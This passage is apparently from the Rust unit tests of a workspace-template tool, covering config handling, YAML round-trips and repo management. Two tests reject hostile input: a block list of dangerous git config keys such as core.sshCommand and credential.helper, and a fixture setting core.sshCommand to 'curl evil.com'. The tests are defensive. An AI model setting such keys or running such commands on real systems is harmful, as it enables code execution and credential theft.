        let effective = tmpl.apply_config(&cfg);
        assert_eq!(effective.sync_strategy.as_deref(), Some("rebase"));
        assert_eq!(
            effective.language_integrations.as_ref().unwrap()["go"],
            true
        );
    }

    #[test]
    fn settings_round_trip_yaml() {
        use std::collections::BTreeMap;

        let tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![TemplateRepo {
                url: "git@github.com:acme/api.git".into(),
            }],
            config: Some(TemplateConfig {
                language_integrations: Some(BTreeMap::from([("go".into(), true)])),
                sync_strategy: Some("merge".into()),
                git_config: None,
            }),
            agent_md: None,
            setup_commands: None,
        };

        let yaml = to_yaml(&tmpl).unwrap();
        let parsed: Template = serde_yaml_ng::from_str(&yaml).unwrap();

        let s = parsed.config.unwrap();
        assert_eq!(s.sync_strategy.as_deref(), Some("merge"));
        assert_eq!(s.language_integrations.as_ref().unwrap()["go"], true);
    }

    #[test]
    fn agent_md_round_trip_yaml() {
        let tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![TemplateRepo {
                url: "git@github.com:acme/api.git".into(),
            }],
            config: None,
            agent_md: Some("# Project Rules\n\nAlways use table-driven tests.".into()),
            setup_commands: None,
        };

        let yaml = to_yaml(&tmpl).unwrap();
        let parsed: Template = serde_yaml_ng::from_str(&yaml).unwrap();

        assert_eq!(
            parsed.agent_md.as_deref(),
            Some("# Project Rules\n\nAlways use table-driven tests.")
        );
    }

    #[test]
    fn agent_md_none_omitted_from_yaml() {
        let tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![TemplateRepo {
                url: "git@github.com:acme/api.git".into(),
            }],
            config: None,
            agent_md: None,
            setup_commands: None,
        };

        let yaml = to_yaml(&tmpl).unwrap();
        assert!(!yaml.contains("agent_md"));
    }

    #[test]
    fn extract_user_content_cases() {
        use crate::agentmd::{MARKER_BEGIN, MARKER_END};

        struct Case {
            name: &'static str,
            input: String,
            want: Option<&'static str>,
        }

        let cases = vec![
            Case {
                name: "user content before markers",
                input: format!(
                    "# My Project\n\nCustom rules here.\n\n{}\ngenerated\n{}\n",
                    MARKER_BEGIN, MARKER_END
                ),
                want: Some("# My Project\n\nCustom rules here."),
            },
            Case {
                name: "only markers, no user content",
                input: format!("{}\ngenerated\n{}\n", MARKER_BEGIN, MARKER_END),
                want: None,
            },
            Case {
                name: "default placeholder only",
                input: format!(
                    "# Workspace: test\n\n<!-- Add your project-specific notes for AI agents here -->\n\n{}\ngenerated\n{}\n",
                    MARKER_BEGIN, MARKER_END
                ),
                want: Some("# Workspace: test"),
            },
            Case {
                name: "no markers at all",
                input: "# Custom content\n\nSome notes.".into(),
                want: Some("# Custom content\n\nSome notes."),
            },
            Case {
                name: "empty file",
                input: "".into(),
                want: None,
            },
            Case {
                name: "user content before and after markers",
                input: format!(
                    "# Header\n\n{}\ngenerated\n{}\n\n# Footer\n",
                    MARKER_BEGIN, MARKER_END
                ),
                want: Some("# Header\n\n# Footer"),
            },
        ];

        for tc in cases {
            let got = crate::agentmd::extract_user_content(&tc.input);
            assert_eq!(got.as_deref(), tc.want, "case: {}", tc.name);
        }
    }

    #[test]
    fn agent_md_full_round_trip_through_file() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        // Create a template with agent_md
        let tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![TemplateRepo {
                url: "git@github.com:acme/api.git".into(),
            }],
            config: None,
            agent_md: Some("# Project Rules\n\nAlways use table-driven tests.".into()),
            setup_commands: None,
        };

        // Save and reload
        save(&dir, "with-agent", &tmpl).unwrap();
        let loaded = load(&dir, "with-agent").unwrap();

        assert_eq!(loaded.agent_md, tmpl.agent_md);
        assert_eq!(loaded.repos.len(), 1);
    }

    #[test]
    fn agent_md_with_markers_rejected() {
        use crate::agentmd::MARKER_BEGIN;

        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("evil.yaml");
        let yaml = format!(
            "repos:\n  - url: git@github.com:acme/api.git\nagent_md: \"fake\\n{}\\nevil\"\n",
            MARKER_BEGIN
        );
        std::fs::write(&path, &yaml).unwrap();

        let err = load_from_file(&path).unwrap_err();
        assert!(
            err.to_string().contains("wsp markers"),
            "expected marker rejection, got: {}",
            err
        );
    }

    #[test]
    fn apply_config_git_config_overrides() {
        use std::collections::BTreeMap;

        let mut cfg = config::Config::default();
        let mut gc = BTreeMap::new();
        gc.insert("push.autoSetupRemote".into(), "true".into());
        cfg.git_config = Some(gc);

        let tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![],
            config: Some(TemplateConfig {
                language_integrations: None,
                sync_strategy: None,
                git_config: Some(BTreeMap::from([(
                    "push.autoSetupRemote".into(),
                    "false".into(),
                )])),
            }),
            agent_md: None,
            setup_commands: None,
        };

        let effective = tmpl.apply_config(&cfg);
        assert_eq!(
            effective.git_config.as_ref().unwrap()["push.autoSetupRemote"],
            "false"
        );
    }

    #[test]
    fn git_config_round_trip_yaml() {
        use std::collections::BTreeMap;

        let tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![TemplateRepo {
                url: "git@github.com:acme/api.git".into(),
            }],
            config: Some(TemplateConfig {
                language_integrations: None,
                sync_strategy: None,
                git_config: Some(BTreeMap::from([
                    ("push.default".into(), "simple".into()),
                    ("rerere.enabled".into(), "false".into()),
                ])),
            }),
            agent_md: None,
            setup_commands: None,
        };

        let yaml = to_yaml(&tmpl).unwrap();
        let parsed: Template = serde_yaml_ng::from_str(&yaml).unwrap();
        let gc = parsed.config.unwrap().git_config.unwrap();
        assert_eq!(gc["push.default"], "simple");
        assert_eq!(gc["rerere.enabled"], "false");
    }

    #[test]
    fn has_customizations_cases() {
        use std::collections::BTreeMap;

        struct Case {
            name: &'static str,
            tmpl: Template,
            expected: bool,
        }

        let cases = vec![
            Case {
                name: "repos only",
                tmpl: sample_template(),
                expected: false,
            },
            Case {
                name: "with agent_md",
                tmpl: Template {
                    name: None,
                    description: None,
                    wsp_version: None,
                    repos: vec![],
                    config: None,
                    agent_md: Some("# Rules".into()),
                    setup_commands: None,
                },
                expected: true,
            },
            Case {
                name: "with git_config",
                tmpl: Template {
                    name: None,
                    description: None,
                    wsp_version: None,
                    repos: vec![],
                    config: Some(TemplateConfig {
                        language_integrations: None,
                        sync_strategy: None,
                        git_config: Some(BTreeMap::from([(
                            "push.default".into(),
                            "simple".into(),
                        )])),
                    }),
                    agent_md: None,
                    setup_commands: None,
                },
                expected: true,
            },
            Case {
                name: "with sync_strategy",
                tmpl: Template {
                    name: None,
                    description: None,
                    wsp_version: None,
                    repos: vec![],
                    config: Some(TemplateConfig {
                        language_integrations: None,
                        sync_strategy: Some("merge".into()),
                        git_config: None,
                    }),
                    agent_md: None,
                    setup_commands: None,
                },
                expected: true,
            },
            Case {
                name: "empty config",
                tmpl: Template {
                    name: None,
                    description: None,
                    wsp_version: None,
                    repos: vec![],
                    config: Some(TemplateConfig::default()),
                    agent_md: None,
                    setup_commands: None,
                },
                expected: false,
            },
        ];

        for tc in cases {
            assert_eq!(
                tc.tmpl.has_customizations(),
                tc.expected,
                "case: {}",
                tc.name
            );
        }
    }

    // -----------------------------------------------------------------------
    // Template mutation helper tests
    // -----------------------------------------------------------------------

    #[test]
    fn add_repos_normal() {
        let mut tmpl = sample_template();
        let skipped = add_repos(&mut tmpl, vec!["git@github.com:acme/proto.git".into()]).unwrap();
        assert!(skipped.is_empty());
        assert_eq!(tmpl.repos.len(), 3);
        assert_eq!(tmpl.repos[2].url, "git@github.com:acme/proto.git");
    }

    #[test]
    fn add_repos_idempotent() {
        let mut tmpl = sample_template();
        let skipped = add_repos(
            &mut tmpl,
            vec!["git@github.com:acme/api-gateway.git".into()],
        )
        .unwrap();
        assert_eq!(skipped, vec!["git@github.com:acme/api-gateway.git"]);
        assert_eq!(tmpl.repos.len(), 2); // unchanged
    }

    #[test]
    fn add_repos_invalid_url() {
        let mut tmpl = sample_template();
        let err = add_repos(&mut tmpl, vec!["not-a-url".into()]).unwrap_err();
        assert!(err.to_string().contains("invalid repo URL"));
    }

    #[test]
    fn remove_repos_by_url() {
        let mut tmpl = sample_template();
        remove_repos(
            &mut tmpl,
            vec!["git@github.com:acme/api-gateway.git".into()],
        )
        .unwrap();
        assert_eq!(tmpl.repos.len(), 1);
        assert_eq!(tmpl.repos[0].url, "git@github.com:acme/user-service.git");
    }

    #[test]
    fn remove_repos_by_identity() {
        let mut tmpl = sample_template();
        remove_repos(&mut tmpl, vec!["github.com/acme/api-gateway".into()]).unwrap();
        assert_eq!(tmpl.repos.len(), 1);
    }

    #[test]
    fn remove_repos_by_shortname() {
        let mut tmpl = sample_template();
        remove_repos(&mut tmpl, vec!["api-gateway".into()]).unwrap();
        assert_eq!(tmpl.repos.len(), 1);
    }

    #[test]
    fn remove_repos_not_found() {
        let mut tmpl = sample_template();
        let err = remove_repos(&mut tmpl, vec!["nonexistent".into()]).unwrap_err();
        assert!(err.to_string().contains("not found"));
    }

    #[test]
    fn remove_repos_ambiguous_shortname() {
        let mut tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![
                TemplateRepo {
                    url: "git@github.com:team-a/utils.git".into(),
                },
                TemplateRepo {
                    url: "git@github.com:team-b/utils.git".into(),
                },
            ],
            config: None,
            agent_md: None,
            setup_commands: None,
        };
        let err = remove_repos(&mut tmpl, vec!["utils".into()]).unwrap_err();
        assert!(err.to_string().contains("ambiguous"));
    }

    #[test]
    fn remove_repos_non_github_shortname() {
        let mut tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![TemplateRepo {
                url: "git@gitlab.company.com:team/service.git".into(),
            }],
            config: None,
            agent_md: None,
            setup_commands: None,
        };
        remove_repos(&mut tmpl, vec!["service".into()]).unwrap();
        assert!(tmpl.repos.is_empty());
    }

    #[test]
    fn set_config_sync_strategy() {
        let mut tmpl = sample_template();
        set_config(&mut tmpl, "sync-strategy", "merge").unwrap();
        assert_eq!(
            tmpl.config.as_ref().unwrap().sync_strategy.as_deref(),
            Some("merge")
        );
    }

    #[test]
    fn set_config_sync_strategy_invalid() {
        let mut tmpl = sample_template();
        let err = set_config(&mut tmpl, "sync-strategy", "fast-forward").unwrap_err();
        assert!(err.to_string().contains("rebase"));
    }

    #[test]
    fn set_config_language_integration() {
        let mut tmpl = sample_template();
        set_config(&mut tmpl, "lang.go", "true").unwrap();
        assert_eq!(
            tmpl.config
                .as_ref()
                .unwrap()
                .language_integrations
                .as_ref()
                .unwrap()["go"],
            true
        );
    }

    #[test]
    fn set_config_language_integration_invalid_value() {
        let mut tmpl = sample_template();
        let err = set_config(&mut tmpl, "lang.go", "yes").unwrap_err();
        assert!(err.to_string().contains("true or false"));
    }

    #[test]
    fn set_config_git_config() {
        let mut tmpl = sample_template();
        set_config(&mut tmpl, "git.push.default", "simple").unwrap();
        assert_eq!(
            tmpl.config.as_ref().unwrap().git_config.as_ref().unwrap()["push.default"],
            "simple"
        );
    }

    #[test]
    fn set_config_git_config_underscore_variant() {
        let mut tmpl = sample_template();
        // git_config. (underscore) normalizes to git. via normalize_key
        set_config(&mut tmpl, "git_config.push.default", "simple").unwrap();
        assert_eq!(
            tmpl.config.as_ref().unwrap().git_config.as_ref().unwrap()["push.default"],
            "simple"
        );
    }

    #[test]
    fn set_config_invalid_key() {
        let mut tmpl = sample_template();
        let err = set_config(&mut tmpl, "branch-prefix", "foo").unwrap_err();
        assert!(err.to_string().contains("invalid template config key"));
    }

    #[test]
    fn set_config_git_config_blocks_dangerous_keys() {
        let dangerous = [
            "git.core.sshCommand",
            "git.core.hooksPath",
            "git.filter.lfs.clean",
            "git.diff.external",
            "git.credential.helper",
        ];
        for key in &dangerous {
            let mut tmpl = sample_template();
            let err = set_config(&mut tmpl, key, "evil").unwrap_err();
            assert!(
                err.to_string().contains("not allowed"),
                "expected '{}' to be blocked, got: {}",
                key,
                err
            );
        }
    }

    #[test]
    fn load_from_file_rejects_dangerous_git_config() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("tmpl.yaml");
        std::fs::write(
            &path,
            "repos:\n  - url: git@github.com:acme/api.git\nconfig:\n  git_config:\n    core.sshCommand: curl evil.com\n",
        )
        .unwrap();
        let err = load_from_file(&path).unwrap_err();
        assert!(
            err.to_string().contains("not allowed") || err.to_string().contains("disallowed"),
            "expected dangerous key rejection, got: {}",
            err
        );
    }

    #[test]
    fn set_config_underscore_normalization() {
        let mut tmpl = sample_template();
        // Underscores in key are normalized to hyphens for matching
        set_config(&mut tmpl, "sync_strategy", "merge").unwrap();
        assert_eq!(
            tmpl.config.as_ref().unwrap().sync_strategy.as_deref(),
            Some("merge")
        );
    }

    #[test]
    fn get_config_present() {
        let mut tmpl = sample_template();
        set_config(&mut tmpl, "sync-strategy", "merge").unwrap();
        let val = get_config(&tmpl, "sync-strategy").unwrap();
        assert_eq!(val.as_deref(), Some("merge"));
    }

    #[test]
    fn get_config_absent() {
        let tmpl = sample_template();
        let val = get_config(&tmpl, "sync-strategy").unwrap();
        assert_eq!(val, None);
    }

    #[test]
    fn unset_config_present() {
        let mut tmpl = sample_template();
        set_config(&mut tmpl, "sync-strategy", "merge").unwrap();
        unset_config(&mut tmpl, "sync-strategy").unwrap();
        assert!(tmpl.config.is_none()); // cleaned up
    }

    #[test]
    fn unset_config_absent() {
        let mut tmpl = sample_template();
        // No error when unsetting something not present
        unset_config(&mut tmpl, "sync-strategy").unwrap();
    }

    #[test]
    fn unset_config_map_cleanup() {
        use std::collections::BTreeMap;

        let mut tmpl = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![TemplateRepo {
                url: "git@github.com:acme/api.git".into(),
            }],
            config: Some(TemplateConfig {
                language_integrations: Some(BTreeMap::from([("go".into(), true)])),
                sync_strategy: None,
                git_config: None,
            }),
            agent_md: None,
            setup_commands: None,
        };

        unset_config(&mut tmpl, "lang.go").unwrap();
        // Config should be cleaned up entirely
        assert!(tmpl.config.is_none());
    }

    #[test]
    fn normalize_key_mappings() {
        struct Case {
            input: &'static str,
            expected: &'static str,
        }
        let cases = vec![
            // Old git_config prefix → git
            Case {
                input: "git_config.push.default",
                expected: "git.push.default",
            },
            Case {
                input: "git-config.push.default",
                expected: "git.push.default",
            },
            // Old language-integrations → lang
            Case {
                input: "language-integrations.go",
                expected: "lang.go",
            },
            Case {
                input: "language_integrations.go",
                expected: "lang.go",
            },
            Case {
                input: "language-integrations",
                expected: "lang",
            },
            // Old experimental.shell-* → shell.*
            Case {
                input: "experimental.shell-tmux",
                expected: "shell.tmux",
            },
            Case {
                input: "experimental.shell-prompt",
                expected: "shell.prompt",
            },
            // New keys pass through unchanged
            Case {
                input: "git.push.default",
                expected: "git.push.default",
            },
            Case {
                input: "lang.go",
                expected: "lang.go",
            },
            Case {
                input: "shell.tmux",
                expected: "shell.tmux",
            },
            Case {
                input: "shell.prompt",
                expected: "shell.prompt",
            },
            // Other keys: underscore → hyphen only
            Case {
                input: "sync-strategy",
                expected: "sync-strategy",
            },
            Case {
                input: "sync_strategy",
                expected: "sync-strategy",
            },
            Case {
                input: "branch-prefix",
                expected: "branch-prefix",
            },
            Case {
                input: "gc.retention-days",
                expected: "gc.retention-days",
            },
        ];

        for tc in cases {
            assert_eq!(
                normalize_key(tc.input),
                tc.expected,
                "normalize_key({:?})",
                tc.input
            );
        }
    }

    #[test]
    fn validate_template_config_key_cases() {
        struct Case {
            name: &'static str,
            key: &'static str,
            want_err: bool,
        }

        let cases = vec![
            Case {
                name: "sync-strategy",
                key: "sync-strategy",
                want_err: false,
            },
            Case {
                name: "lang go (new)",
                key: "lang.go",
                want_err: false,
            },
            Case {
                name: "lang go (old)",
                key: "language-integrations.go",
                want_err: false,
            },
            Case {
                name: "git config (new)",
                key: "git.push.default",
                want_err: false,
            },
            Case {
                name: "git config (old)",
                key: "git-config.push.default",
                want_err: false,
            },
            Case {
                name: "underscore variant",
                key: "sync_strategy",
                want_err: false,
            },
            Case {
                name: "branch-prefix",
                key: "branch-prefix",
                want_err: true,
            },
            Case {
                name: "workspaces-dir",
                key: "workspaces-dir",
                want_err: true,
            },
            Case {
                name: "gc.retention-days",
                key: "gc.retention-days",
                want_err: true,
            },
            Case {
                name: "agent-md",
                key: "agent-md",
                want_err: true,
            },
            Case {
                name: "random key",
                key: "foo-bar",
                want_err: true,
            },
        ];

        for tc in cases {
            let result = super::validate_template_config_key(tc.key);
            assert_eq!(result.is_err(), tc.want_err, "case: {}", tc.name);
        }
    }

    #[test]
    fn new_fields_backward_compat() {
        // Old format without name/description/wsp_version should load fine
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("old.yaml"),
            "repos:\n  - url: git@github.com:acme/api.git\n",
        )
        .unwrap();

        let t = load(&dir, "old").unwrap();
        assert!(t.name.is_none());
        assert!(t.description.is_none());
        assert!(t.wsp_version.is_none());
        assert_eq!(t.repos.len(), 1);
    }

    #[test]
    fn new_fields_round_trip() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        let t = Template {
            name: Some("dash".into()),
            description: Some("Data science stack".into()),
            wsp_version: Some("0.8.0".into()),
            repos: vec![TemplateRepo {
                url: "git@github.com:acme/api.git".into(),
            }],
            config: None,
            agent_md: None,
            setup_commands: None,
        };
        save(&dir, "dash", &t).unwrap();

        let loaded = load(&dir, "dash").unwrap();
        assert_eq!(loaded.name.as_deref(), Some("dash"));
        assert_eq!(loaded.description.as_deref(), Some("Data science stack"));
        assert_eq!(loaded.wsp_version.as_deref(), Some("0.8.0"));
    }

    #[test]
    fn new_fields_omitted_when_none() {
        let t = sample_template();
        let yaml = to_yaml(&t).unwrap();
        assert!(!yaml.contains("name:"));
        assert!(!yaml.contains("description:"));
        assert!(!yaml.contains("wsp_version:"));
    }

    #[test]
    fn source_sidecar_round_trip() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        let source = ImportSource {
            source_path: "/path/to/dash.wsp.yaml".into(),
            imported_at: chrono::Utc::now(),
        };
        save_source(&dir, "dash", &source).unwrap();

        let loaded = load_source(&dir, "dash").unwrap().unwrap();
        assert_eq!(loaded.source_path, "/path/to/dash.wsp.yaml");
    }

    #[test]
    fn source_sidecar_not_found() {
        let tmp = tempfile::tempdir().unwrap();
        let result = load_source(tmp.path(), "nonexistent").unwrap();
        assert!(result.is_none());
    }

    #[test]
    fn delete_cleans_up_sidecar() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        save(&dir, "dash", &sample_template()).unwrap();
        save_source(
            &dir,
            "dash",
            &ImportSource {
                source_path: "/path/to/dash.wsp.yaml".into(),
                imported_at: chrono::Utc::now(),
            },
        )
        .unwrap();

        assert!(exists(&dir, "dash"));
        assert!(source_path(&dir, "dash").exists());

        delete(&dir, "dash").unwrap();
        assert!(!exists(&dir, "dash"));
        assert!(!source_path(&dir, "dash").exists());
    }

    #[test]
    fn list_excludes_source_sidecars() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("templates");

        save(&dir, "dash", &sample_template()).unwrap();
        save_source(
            &dir,
            "dash",
            &ImportSource {
                source_path: "/path/to/dash.wsp.yaml".into(),
                imported_at: chrono::Utc::now(),
            },
        )
        .unwrap();

        let names = list(&dir).unwrap();
        assert_eq!(names, vec!["dash"]);
        // Verify the source file exists on disk but isn't listed
        assert!(source_path(&dir, "dash").exists());
    }

    #[test]
    fn derive_name_precedence() {
        // name field takes priority
        let t = Template {
            name: Some("from-yaml".into()),
            description: None,
            wsp_version: None,
            repos: vec![],
            config: None,
            agent_md: None,
            setup_commands: None,
        };
        assert_eq!(
            derive_name_from_file(Path::new("dash.wsp.yaml"), &t),
            "from-yaml"
        );

        // Fallback to filename stem
        let t2 = Template {
            name: None,
            description: None,
            wsp_version: None,
            repos: vec![],
            config: None,
            agent_md: None,
            setup_commands: None,
        };
        assert_eq!(
            derive_name_from_file(Path::new("dash.wsp.yaml"), &t2),
            "dash"
        );
        assert_eq!(
            derive_name_from_file(Path::new("backend.yaml"), &t2),
            "backend"
        );
    }
}
